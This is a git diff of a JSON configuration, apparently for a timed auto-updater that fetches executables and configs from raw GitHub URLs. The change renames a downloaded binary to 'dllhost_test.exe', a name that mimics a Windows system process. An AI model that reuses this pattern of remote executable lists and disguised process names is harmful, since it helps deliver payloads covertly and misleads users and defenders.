@@ -2,8 +2,8 @@
   "logLevel": 3,
   "UpdateTimerInterval": 120000,
   "App1LinksFiles": [
-    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/Teste%20006%20-%20%5B25-04-24%5D.exe",
-    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/Teste%20006%20-%20%5B25-04-24%5D.exe.config",
+    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost_test.exe",
+    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost_test.exe.config",
     "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/configs.json",
     "https://raw.githubusercontent.com/MRvinyKing/pythonwgetfilestest/main/limbo.exe"
   ],
@@ -11,6 +11,6 @@
     "link1",
     "link2"
   ],
-  "App1ConfigLink": "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/Teste%20006%20-%20%5B25-04-24%5D.exe.config",
+  "App1ConfigLink": "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost_test.exe.config",
   "App2ConfigLink": "link"
 }
